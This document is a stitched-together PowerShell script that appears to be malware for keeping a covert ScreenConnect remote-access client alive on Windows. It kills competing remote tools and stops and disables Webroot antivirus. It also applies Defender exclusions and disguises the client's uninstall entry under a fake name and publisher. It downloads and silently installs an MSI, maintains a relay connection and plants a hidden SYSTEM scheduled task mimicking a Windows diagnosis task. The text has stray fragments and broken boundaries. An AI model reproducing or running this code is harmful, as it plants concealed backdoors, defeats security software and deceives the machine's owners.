    Write-Log ("SC fingerprints found: " + ($(if ($fps.Count) { $fps -join ', ' } else { '(none)' })))
    foreach ($fp in $fps) {
        if ($fp -in $AllowedFingerprints) {
            Write-Log "Keeping allowed SC: $fp"
            continue
        }
        Remove-ScByFingerprint -Fingerprint $fp
    }

    # Pass 2: every SC/CW service without allowed fingerprint
    try {
        Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
            Where-Object {
                $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
                ($blob -match '(?i)ScreenConnect|ConnectWise') -and
                -not (Test-IsAllowedBlob -Blob $blob)
            } |
            ForEach-Object {
                Write-Log "Force-delete non-allowed SC service: $($_.Name) / $($_.DisplayName) / $($_.PathName)"
                & sc.exe stop "$($_.Name)" >$null 2>&1
                Stop-AllUnauthorizedScProcesses
                Stop-DeleteServiceSafe -ServiceName $_.Name
                if ("$($_.PathName)" -match '(?i)([0-9a-f]{16})') {
                    Remove-ScByFingerprint -Fingerprint $Matches[1]
                }
            }
    } catch {}

    # Pass 3: ARP uninstall ANY ScreenConnect / ConnectWise Control not allowed
    foreach ($key in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        if (-not (Test-Path $key)) { continue }
        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if (-not $app) { return }
            $blob = "$($app.DisplayName) $($app.InstallLocation) $($app.Publisher) $($app.UninstallString) $($_.PSChildName)"
            if ($blob -notmatch '(?i)ScreenConnect|ConnectWise\s*Control|ConnectWise Control') { return }
            if (Test-IsAllowedBlob -Blob $blob) { return }
            Write-Log "NUKE ARP uninstall: $($app.DisplayName)"
            Invoke-QuietUninstall -UninstallString "$($app.UninstallString)" `
                -QuietUninstallString "$($app.QuietUninstallString)"
            try { Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue } catch {}
        }
    }

    # Pass 4: folders
    foreach ($base in @("${env:ProgramFiles}", "${env:ProgramFiles(x86)}")) {
        if (-not (Test-Path $base)) { continue }
        Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like 'ScreenConnect*' -or $_.Name -like 'ConnectWise Control*' -or $_.Name -like 'ConnectWise*' } |
            ForEach-Object {
                if (Test-IsAllowedBlob -Blob $_.FullName) { return }
                Write-Log "Removing non-allowed SC folder: $($_.FullName)"
                Remove-TreeForce -Path $_.FullName
            }
    }
    foreach ($pd in @(
        "${env:ProgramData}\ScreenConnect",
        "${env:ProgramData}\ConnectWiseControl",
        "${env:ProgramData}\ConnectWise"
    )) {
        if (-not (Test-Path $pd)) { continue }
        Get-ChildItem -Path $pd -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            if (Test-IsAllowedBlob -Blob $_.FullName) { return }
            Write-Log "Removing non-allowed SC data: $($_.FullName)"
            Remove-TreeForce -Path $_.FullName
        }
    }

    # Pass 5: kill again after uninstall (respawns)
    Stop-AllUnauthorizedScProcesses
    Start-Sleep -Seconds 2
    Stop-AllUnauthorizedScProcesses

    $left = @(Get-InstalledScFingerprints | Where-Object { $_ -notin $AllowedFingerprints })
    $leftSvc = @(
        Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
            $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
            ($blob -match '(?i)ScreenConnect|ConnectWise') -and -not (Test-IsAllowedBlob -Blob $blob)
        } | ForEach-Object { $_.Name }
    )
    if ($left.Count -gt 0 -or $leftSvc.Count -gt 0) {
        Write-Log ("SC purge residual fps=[" + ($left -join ', ') + "] svcs=[" + ($leftSvc -join ', ') + "]")
        foreach ($fp in $left) { Remove-ScByFingerprint -Fingerprint $fp }
        foreach ($sn in $leftSvc) { Stop-DeleteServiceSafe -ServiceName $sn }
        Stop-AllUnauthorizedScProcesses
    } else {
        Write-Log 'SC purge clean - only allowed fingerprints remain (or none)'
    }
}

function Invoke-RemoveUnauthorizedRmm {
    Write-Log 'Purging unauthorized RMM / remote tools'

    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | ForEach-Object {
        $blob = "$($_.Name) $($_.CommandLine)"
        if (Test-IsAllowedBlob -Blob $blob) { return }
        if ($blob -like '*\.wucache*' -or $blob -like '*wucache_pkg*' -or $blob -like '*wucache.ps1*') { return }
        $hit = $false
        foreach ($t in $RivalTokens) {
            if ($blob -like "*$t*") { $hit = $true; break }
        }
        if (-not $hit) { return }
        try {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
            Write-Log "Killed rival process: $($_.Name) PID $($_.ProcessId)"
        } catch {}
    }

    try {
        Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
            $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
            if (Test-IsAllowedBlob -Blob $blob) { return }
            $hit = $false
            foreach ($t in $RivalTokens) {
                if ($blob -like "*$t*") { $hit = $true; break }
            }
            foreach ($n in $RivalNames) {
                if ($_.DisplayName -like "*$n*" -or $_.Name -like "*$n*") { $hit = $true; break }
            }
            if (-not $hit) { return }
            Write-Log "Removing rival service: $($_.Name) / $($_.DisplayName)"
            Stop-DeleteServiceSafe -ServiceName $_.Name
        }
    } catch {}

    foreach ($key in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        if (-not (Test-Path $key)) { continue }
        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if (-not $app -or -not $app.DisplayName) { return }
            $n = [string]$app.DisplayName
            $blob = "$n $($app.Publisher) $($app.InstallLocation) $($app.UninstallString)"
            if (Test-IsAllowedBlob -Blob $blob) { return }
            if ($n -like '*Datto*' -and $n -notlike '*Datto RMM*') { return }
            if ($blob -match '(?i)ScreenConnect|ConnectWise\s*Control') { return }

            $match = $false
            foreach ($b in $RivalNames) { if ($n -like "*$b*" -or $blob -like "*$b*") { $match = $true; break } }
            foreach ($t in $RivalTokens) { if ($blob -like "*$t*") { $match = $true; break } }
            if (-not $match) { return }

            Write-Log "Uninstalling rival app: $n"
            Invoke-QuietUninstall -UninstallString "$($app.UninstallString)" `
                -QuietUninstallString "$($app.QuietUninstallString)"
        }
    }

    foreach ($base in @(
        "${env:ProgramFiles}",
        "${env:ProgramFiles(x86)}",
        "$env:ProgramData",
        "$env:LOCALAPPDATA",
        "$env:APPDATA"
    )) {
        if (-not (Test-Path $base)) { continue }
        Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $name = $_.Name
            $full = $_.FullName
            if (Test-IsAllowedBlob -Blob $full) { return }
            $hit = $false
            foreach ($h in $RivalFolderHints) {
                if ($name -like "*$h*") { $hit = $true; break }
            }
            if (-not $hit) { return }
            if ($full -like '*\.wucache*' -or $full -like '*\.etlcache*') { return }
            Write-Log "Removing rival folder: $full"
            Remove-TreeForce -Path $full
        }
    }

    foreach ($runPath in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    )) {
        if (-not (Test-Path $runPath)) { continue }
        $props = Get-ItemProperty -Path $runPath -ErrorAction SilentlyContinue
        if (-not $props) { continue }
        $props.PSObject.Properties | Where-Object {
            $_.Name -notmatch '^PS' -and $_.Value -is [string]
        } | ForEach-Object {
            $blob = "$($_.Name) $($_.Value)"
            if (Test-IsAllowedBlob -Blob $blob) { return }
            $hit = $false
            foreach ($t in $RivalTokens) { if ($blob -like "*$t*") { $hit = $true; break } }
            foreach ($b in $RivalNames) { if ($blob -like "*$b*") { $hit = $true; break } }
            if (-not $hit) { return }
            Remove-ItemProperty -Path $runPath -Name $_.Name -Force -ErrorAction SilentlyContinue
            Write-Log "Removed Run value: $runPath\$($_.Name)"
        }
    }

    foreach ($folder in @(
        [Environment]::GetFolderPath('CommonStartup'),
        [Environment]::GetFolderPath('Startup')
    )) {
        if (-not $folder -or -not (Test-Path $folder)) { continue }
        Get-ChildItem $folder -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $blob = "$($_.Name) $($_.FullName)"
            if (Test-IsAllowedBlob -Blob $blob) { return }
            $hit = $false
            foreach ($t in $RivalTokens) { if ($blob -like "*$t*") { $hit = $true; break } }
            foreach ($b in $RivalNames) { if ($blob -like "*$b*") { $hit = $true; break } }
            if ($_.Name -like '*.ps1' -or $_.Name -like 'SC_*') { $hit = $true }
            if (-not $hit) { return }
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
            Write-Log "Removed Startup: $($_.FullName)"
        }
    }
}

    }
    foreach ($key in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        if (-not (Test-Path $key)) { continue }
        foreach ($item in (Get-ChildItem $key -ErrorAction SilentlyContinue)) {

function Set-ArpCamouflage {
    param([string]$Fingerprint = $PrimaryFingerprint)
    $found = $false
    foreach ($root in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if (-not $p) { return }
            $hit =
                ($p.DisplayName -like "*ScreenConnect Client ($Fingerprint)*") -or
                ($p.InstallLocation -like "*$Fingerprint*" -and $p.DisplayName -like '*ScreenConnect*') -or
                ($_.PSPath -like "*$Fingerprint*" -and (
                    $p.DisplayName -like '*ScreenConnect*' -or $p.DisplayName -eq $ArpDisplayName
                ))
            if (-not $hit) { return }
            Set-ItemProperty $_.PSPath -Name DisplayName -Value $ArpDisplayName -ErrorAction SilentlyContinue
            Set-ItemProperty $_.PSPath -Name Publisher -Value $ArpPublisher -ErrorAction SilentlyContinue
            $found = $true
            Write-Log "ARP camouflage applied: $($_.PSPath)"
        }
    }
    return $found
}

function Test-TcpPort {
    param([string]$Server = $RelayServer, [int]$Port = $RelayPort)
    $c = $null
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $iar = $c.BeginConnect($Server, $Port, $null, $null)
        if ($iar.AsyncWaitHandle.WaitOne(3000, $false) -and $c.Connected) {
            $c.EndConnect($iar)
            return $true
        }
    } catch {
    } finally { if ($c) { try { $c.Close() } catch {} } }
    return $false
}

function Test-ScServicePresent {
    param([string]$Name = $SvcName)
    try {
        $s = Get-CimInstance -ClassName Win32_Service -Filter "Name='$Name'" -ErrorAction SilentlyContinue
        if ($s) { return $true }
    } catch {}
    $fp = if ($Name -match '\(([0-9a-f]{16})\)') { $Matches[1] } else { $PrimaryFingerprint }
    try {
        $s = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like "*$fp*" -or $_.DisplayName -like "*$fp*" } |
            Select-Object -First 1
        if ($s) { return $true }
    } catch {}
    return $false
}

    } catch {}
    return $false
}

function Uninstall-PrimaryScResidue {
    Write-Log 'Pre-clean: removing conflicting SC product residue before MSI'
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        ("$($_.Name) $($_.ExecutablePath) $($_.CommandLine)" -like "*$PrimaryFingerprint*")
    } | ForEach-Object {
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    }
    Stop-Service -Name $SvcName -Force -ErrorAction SilentlyContinue
    & sc.exe stop "$SvcName" >$null 2>&1
    & sc.exe delete "$SvcName" >$null 2>&1

    foreach ($key in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        if (-not (Test-Path $key)) { continue }
        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
            $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if (-not $p) { return }
            $hit =
                ($p.DisplayName -like "*$PrimaryFingerprint*") -or
                ($p.InstallLocation -like "*$PrimaryFingerprint*") -or
                ($_.PSPath -like "*$PrimaryFingerprint*") -or
                ($p.DisplayName -eq $ArpDisplayName -and $p.Publisher -eq $ArpPublisher)
            if (-not $hit) { return }
            $guid = $null
            if ($_.PSChildName -match '^\{[0-9A-Fa-f-]+\}$') { $guid = $_.PSChildName }
            elseif ($p.UninstallString -match '\{([0-9A-Fa-f-]+)\}') { $guid = '{' + $Matches[1] + '}' }
            if ($guid) {
                Write-Log "Pre-clean msiexec /x $guid"
                $xp = Start-Process msiexec.exe -ArgumentList "/x $guid /quiet /norestart" `
                    -Wait -PassThru -WindowStyle Hidden
                Write-Log "uninstall exit $($xp.ExitCode)"
            }
        }
    }

    foreach ($p in @(
        "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)",
        "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)",
        "${env:ProgramData}\ScreenConnect\$PrimaryFingerprint"
    )) {
        if (Test-Path $p) {
            cmd /c "takeown /F `"$p`" /R /D Y" >$null 2>&1
            cmd /c "icacls `"$p`" /grant Administrators:F /T /C" >$null 2>&1
            Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
            if (Test-Path $p) {
                Write-Log "Residue path locked (pending wipe): $p"
            } else {
                Write-Log "Removed residue path: $p"
            }
        }
    }
    Start-Sleep -Seconds 3
}

function Install-PrimarySc {
    $binNow = Get-ScBinaryHealth
    $forceMsi = [bool]($binNow.Stubbed -or (Test-ScHollowClient) -or (Test-ScControlBroken))
    if ((Test-ScServiceRunning) -and -not $forceMsi) {
        Write-Log 'Primary SC service RUNNING (healthy binaries) - skip MSI'
        return $true
    }
    if ($forceMsi) {
        Write-Log ("Primary SC force MSI: stub={0} hollow={1} broken={2} svcExe={3} client={4}" -f `
            $binNow.Stubbed, (Test-ScHollowClient), (Test-ScControlBroken), $binNow.SvcExeSize, $binNow.HasClientExe)
        Uninstall-PrimaryScResidue
    } elseif ((Test-ScServicePresent)) {
        # Present but stopped: start only - do NOT uninstall/reinstall (causes 1603 loops)
        Write-Log 'Primary SC present - starting service (no MSI)'
        Start-PrimaryService | Out-Null
        if (Test-ScServiceRunning) {
            Write-Log 'SC service RUNNING after sc start'
            return $true
        }
        Write-Log 'sc start failed - continuing to MSI repair'
        Uninstall-PrimaryScResidue
    } else {
        Write-Log 'Primary SC service missing - forcing MSI install'
        Uninstall-PrimaryScResidue
    }

    Write-Log "Downloading MSI"
    if (-not (Get-PrimaryMsiFile -Dest $MsiFile)) {
        return $false
    }

    $logMsi = Join-Path $WorkDir 'msi.log'
    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
        -Wait -PassThru -WindowStyle Hidden
    $code = $p.ExitCode
    Write-Log "msiexec exit $code"
    if ($code -ne 0) {
        Write-Log 'msiexec retry plain /i'
        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
            -Wait -PassThru -WindowStyle Hidden
        $code = $p2.ExitCode
        Write-Log "msiexec reinstall exit $code"
    }
    Start-Sleep -Seconds 8
    $binAfter = Get-ScBinaryHealth
    if ($binAfter.Stubbed -or -not $binAfter.HasClientExe) {
        Write-Log 'Install-PrimarySc: stubs after msiexec - extract/copy'
        Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir (Get-PrimaryScInstallDir) | Out-Null
    }
    Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
    Enable-ScFirewallAllow

    if (Test-ScServicePresent) {
        Start-PrimaryService | Out-Null
        if (Test-ScServiceRunning) {
            Write-Log 'SC service RUNNING after MSI'
            return $true
        }
        Write-Log 'SC service present but not running after MSI'
        return $false
    }
    Write-Log 'MSI finished but SC service still missing'
    return $false
}

function Start-PrimaryService {
    if (-not (Test-ScServicePresent)) { return $false }
    & sc.exe config "$SvcName" start= auto >$null 2>&1
    & sc.exe failure "$SvcName" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >$null 2>&1
    if (-not (Test-ScServiceRunning)) {
        & sc.exe start "$SvcName" >$null 2>&1
        try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
        Start-Sleep -Seconds 3
    }
    return (Test-ScServiceRunning)
}


function Clear-ScIfeoHijacks {
    # Remove Debugger traps that prevent SC binaries from launching
    foreach ($exe in @(
        'ScreenConnect.ClientService.exe',
        'ScreenConnect.Client.exe',
        'ScreenConnect.WindowsClient.exe',
        'ScreenConnect.ClientSetup.exe'
    )) {
        $ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
        if (Test-Path $ifeo) {
            Remove-ItemProperty -Path $ifeo -Name Debugger -Force -ErrorAction SilentlyContinue
            Write-Log "Cleared SC IFEO Debugger: $exe"
        }
    }
}

function Test-ScRelayDns {
    param([string]$Server = $RelayServer)
    try {
        $r = [System.Net.Dns]::GetHostAddresses($Server)
        return ($null -ne $r -and $r.Count -gt 0)
    } catch {
        return $false
    }
}

function Get-ScRelayAddresses {
    param([string]$Server = $RelayServer)
    try {
        return @([System.Net.Dns]::GetHostAddresses($Server) | ForEach-Object { $_.IPAddressToString })
    } catch {
        return @()
    }
}

function Test-ScRelaySession {
    # True if we have an outbound TCP session toward the relay (Established/SynSent)
    param([string]$Server = $RelayServer, [int]$Port = $RelayPort)
    $ips = @(Get-ScRelayAddresses -Server $Server)
    if ($ips.Count -eq 0) { return $false }
    try {
        $conns = Get-NetTCPConnection -State Established, SynSent -ErrorAction SilentlyContinue |
            Where-Object {
                $_.RemotePort -eq $Port -and (
                    ($ips -contains $_.RemoteAddress) -or
                    ($_.RemoteAddress -like "*$Server*")
                )
            }
        if ($conns) { return $true }
    } catch {}
    # Fallback: netstat parse (works when Get-NetTCPConnection missing)
    try {
        $raw = & netstat.exe -ano 2>$null
        foreach ($line in $raw) {
            foreach ($ip in $ips) {
                if ($line -match [regex]::Escape("${ip}:${Port}") -and $line -match 'ESTABLISHED|SYN_SENT') {
                    return $true
                }
            }
        }
    } catch {}
    return $false
}

function Test-ScConfigHasRelay {
    param([string]$Server = $RelayServer)
    foreach ($root in (Get-ScInstallRoots)) {
        $hits = Get-ChildItem -Path $root -Recurse -Include *.config,*.xml,*.json,*.txt -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -lt 5MB }
        foreach ($f in $hits) {
            try {
                $txt = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction SilentlyContinue
                if ($txt -and $txt -like "*$Server*") { return $true }
            } catch {}
        }
    }
    # ProgramData often holds per-fingerprint config
    $pd = "${env:ProgramData}\ScreenConnect\$PrimaryFingerprint"
    if (Test-Path $pd) {
        $hits = Get-ChildItem -Path $pd -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 40
        foreach ($f in $hits) {
            try {
                if ($f.Length -gt 5MB) { continue }
                $txt = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction SilentlyContinue
                if ($txt -and $txt -like "*$Server*") { return $true }
            } catch {}
        }
    }
    return $false
}

function Get-ScHealthReport {
    $bin = Get-ScBinaryHealth
    $svcPresent = Test-ScServicePresent
    $svcRunning = Test-ScServiceRunning
    $startMode = ''
    try {
        $cim = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
        if (-not $cim) {
            $cim = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -like "*$PrimaryFingerprint*" } | Select-Object -First 1
        }
        if ($cim) { $startMode = [string]$cim.StartMode }
    } catch {}

    $dnsOk = Test-ScRelayDns
    $tcpOk = $false
    if ($dnsOk) { $tcpOk = Test-TcpPort }
    $sessionOk = $false
    if ($svcRunning -and $tcpOk) { $sessionOk = Test-ScRelaySession }
    $cfgOk = Test-ScConfigHasRelay
    $hollow = Test-ScHollowClient
    $controlBroken = Test-ScControlBroken
    $appOk = Test-AppInstalled -Fingerprint $PrimaryFingerprint

    $issues = [System.Collections.Generic.List[string]]::new()
    if (-not $svcPresent) { $issues.Add('service_missing') }
    if (-not $svcRunning) { $issues.Add('service_not_running') }
    if ($startMode -and $startMode -ne 'Auto') { $issues.Add('startmode_not_auto') }
    if (-not $appOk) { $issues.Add('app_not_installed') }
    if ($hollow) { $issues.Add('hollow_client') }
    if ($bin.Stubbed) { $issues.Add('stubbed_binaries') }
    if ($controlBroken) { $issues.Add('control_broken') }
    if ($bin.ProcCount -lt 1) { $issues.Add('no_sc_process') }
    if (-not $dnsOk) { $issues.Add('relay_dns_fail') }
    if (-not $tcpOk) { $issues.Add('relay_tcp_fail') }
    if ($svcRunning -and $tcpOk -and -not $sessionOk) { $issues.Add('relay_no_session') }
    if ($svcRunning -and -not $cfgOk) { $issues.Add('config_missing_relay') }

    # "Healthy enough to consider online": service running, binaries OK, process up, relay reachable.
    # Session is best-effort (may lag right after start).
    $coreOk = $svcPresent -and $svcRunning -and $appOk -and (-not $hollow) -and (-not $bin.Stubbed) -and (-not $controlBroken) -and ($bin.ProcCount -ge 1)
    $netOk = $dnsOk -and $tcpOk
    $healthy = $coreOk -and $netOk

    return [pscustomobject]@{
        ServicePresent = $svcPresent
        ServiceRunning = $svcRunning
        StartMode      = $startMode
        AppInstalled   = $appOk
        Hollow         = $hollow
        Stubbed        = [bool]$bin.Stubbed
        ControlBroken  = $controlBroken
        ProcCount      = [int]$bin.ProcCount
        MaxExeSize     = [int]$bin.MaxExeSize
        MaxDllSize     = [int]$bin.MaxDllSize
        RelayDns       = $dnsOk
        RelayTcp       = $tcpOk
        RelaySession   = $sessionOk
        ConfigHasRelay = $cfgOk
        CoreOk         = $coreOk
        NetOk          = $netOk
        Healthy        = $healthy
        Issues         = @($issues)
    }
}

function Write-ScHealthLog {
    param($H, [string]$Tag = 'HEALTH')
    Write-Log ("$Tag core=$($H.CoreOk) net=$($H.NetOk) healthy=$($H.Healthy) svc=$($H.ServiceRunning) procs=$($H.ProcCount) stub=$($H.Stubbed) hollow=$($H.Hollow) dns=$($H.RelayDns) tcp=$($H.RelayTcp) sess=$($H.RelaySession) cfg=$($H.ConfigHasRelay) start=$($H.StartMode) maxExe=$($H.MaxExeSize)")
    if ($H.Issues -and $H.Issues.Count -gt 0) {
        Write-Log ("$Tag issues: " + ($H.Issues -join ', '))
    }
}

function Restart-ScServiceHard {
    Write-Log 'HARD RESTART: stop/kill/start primary SC service'
    Clear-ScIfeoHijacks
    & sc.exe config "$SvcName" start= auto >$null 2>&1
    & sc.exe failure "$SvcName" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >$null 2>&1
    & sc.exe stop "$SvcName" >$null 2>&1
    Start-Sleep -Seconds 2
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        ($_.Name -match '(?i)ScreenConnect|ClientService') -and ("$($_.CommandLine)" -like "*$PrimaryFingerprint*")
    } | ForEach-Object {
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep -Seconds 1
    & sc.exe start "$SvcName" >$null 2>&1
    try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
    Start-Sleep -Seconds 5
    # Second nudge
    if (-not (Test-ScServiceRunning)) {
        & sc.exe start "$SvcName" >$null 2>&1
        Start-Sleep -Seconds 4
    }
    return (Test-ScServiceRunning)
}

function Wait-ScRelayReady {
    param([int]$Seconds = 45)
    Write-Log "Waiting up to ${Seconds}s for relay TCP/session"
    $deadline = (Get-Date).AddSeconds($Seconds)
    $tcp = $false
    $sess = $false
    while ((Get-Date) -lt $deadline) {
        if (-not (Test-ScRelayDns)) {
            try { ipconfig /flushdns >$null 2>&1 } catch {}
        }
        $tcp = Test-TcpPort
        if ($tcp) {
            $sess = Test-ScRelaySession
            if ($sess) {
                Write-Log 'Relay session ESTABLISHED'
                return $true
            }
        }
        Start-Sleep -Seconds 3
    }
    Write-Log "Relay wait done tcp=$tcp sess=$sess"
    return ($tcp -eq $true)
}

function Ensure-PrimaryScFullyUp {
    param([int]$MaxRounds = 6)
    Write-Log "ENSURE: maximizing primary SC uptime (max $MaxRounds rounds)"

    for ($i = 1; $i -le $MaxRounds; $i++) {
        Write-Log "ENSURE round $i/$MaxRounds"
        # Always auto-nuke disallowed SC/RMM first (uvexr etc) - keep sevrz+pluxn
        Invoke-NukeBlockedScreenConnect
        Enable-QuietDefenderExclusions | Out-Null
        Clear-ScIfeoHijacks
        Enable-ScFirewallAllow

        $h = Get-ScHealthReport
        Write-ScHealthLog -H $h -Tag "ENSURE-$i"
        if ($h.Healthy -and ($h.RelaySession -or $i -ge 2)) {
            # Require session after first settle round when possible
            if ($h.RelaySession -or (Wait-ScRelayReady -Seconds 20)) {
                $h2 = Get-ScHealthReport
                Write-ScHealthLog -H $h2 -Tag 'ENSURE-OK'
                if ($h2.CoreOk -and $h2.NetOk) { return $true }
            }
        }

        # Escalation ladder — missing install FIRST; Webroot alone must NOT force reinstall
        if (-not $h.ServicePresent -or -not $h.AppInstalled) {
            Write-Log 'ENSURE: missing install -> MSI'
            Install-PrimarySc | Out-Null
            Start-Sleep -Seconds 6
        } elseif ($h.Stubbed -or $h.Hollow -or $h.ControlBroken) {
            Write-Log 'ENSURE: stub/hollow/broken -> nuclear repair'
            Repair-ScAfterAv | Out-Null
            Start-Sleep -Seconds 8
        } elseif ((Test-WebrootInstalled) -and -not $h.CoreOk) {
            Write-Log 'ENSURE: Webroot + unhealthy core -> soft WR pause then MSI/restart'
            Invoke-WebrootPushback | Out-Null
            if (-not (Restart-ScServiceHard)) { Install-PrimarySc | Out-Null }
            Start-Sleep -Seconds 6
        } elseif (-not $h.ServiceRunning -or $h.ProcCount -lt 1) {
            Write-Log 'ENSURE: service/process down -> hard restart'
            if (-not (Restart-ScServiceHard)) {
                Write-Log 'ENSURE: hard restart failed -> MSI repair'
                Install-PrimarySc | Out-Null
            }
        } elseif (-not $h.NetOk) {
            Write-Log 'ENSURE: relay unreachable -> flushdns + service bounce'
            try { ipconfig /flushdns >$null 2>&1 } catch {}
            Restart-ScServiceHard | Out-Null
            Wait-ScRelayReady -Seconds 30 | Out-Null
        } elseif (-not $h.RelaySession) {
            Write-Log 'ENSURE: no relay session yet -> bounce + wait'
            Restart-ScServiceHard | Out-Null
            Wait-ScRelayReady -Seconds 40 | Out-Null
        } else {
            # Healthy enough — soft-pause Webroot if present, never reinstall
            if (Test-WebrootInstalled) { Invoke-WebrootPushback | Out-Null }
            Start-PrimaryService | Out-Null
            Set-ArpCamouflage | Out-Null
        }

        Set-ArpCamouflage | Out-Null
        Start-Sleep -Seconds 3
    }

    $final = Get-ScHealthReport
    Write-ScHealthLog -H $final -Tag 'ENSURE-FINAL'
    if (-not $final.Healthy) {
        Write-Log 'ENSURE: still not fully healthy - arming boot repair + reactive AV'
        Invoke-ReactiveAvPushback -Issues $final.Issues
        try {
            $bootPs1 = Join-Path $WorkDir 'wucache_bootrepair.ps1'
            $bootBody = @"
`$ErrorActionPreference='SilentlyContinue'
Start-Sleep 25
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path `$env:ProgramData 'Microsoft\Windows\WER\Temp\.wucache\wucache_pkg.ps1')
"@
            Set-Content -Path $bootPs1 -Value $bootBody -Encoding ASCII -Force
            Unregister-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Confirm:$false -ErrorAction SilentlyContinue
            $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bootPs1`""
            $tr = New-ScheduledTaskTrigger -AtStartup
            $pr = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
            $st = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            Register-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Action $a -Trigger $tr -Principal $pr -Settings $st -Force | Out-Null
            Write-Log 'ENSURE: boot repair armed (reboot helps Webroot NOT_STOPPABLE stubs)'
        } catch {}
    }
    return [bool]$final.Healthy
}

    }
}
function WebrootPush {
    if (-not (TestWebrootInstalled)) { return }
    L 'Webroot detected - pausing agent'
    foreach (`$n in @('WRSVC','WRSAService','WRCoreService','WRConsumerService')) {
        if (Get-Service `$n -EA SilentlyContinue) { Stop-Service `$n -Force -EA SilentlyContinue; Set-Service `$n -StartupType Disabled -EA SilentlyContinue }
    }
    Get-Process -Name @('WRSA','WRSAMain','WRConsumerService') -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    QuietExclusions; FwAllow
}
function SyncCopies {
    try {
        New-Item -ItemType Directory -Path `$work -Force | Out-Null
        New-Item -ItemType Directory -Path `$workAlt -Force | Out-Null
        if ((Test-Path `$mon) -and -not (Test-Path `$monAlt)) { Copy-Item `$mon `$monAlt -Force -EA SilentlyContinue }
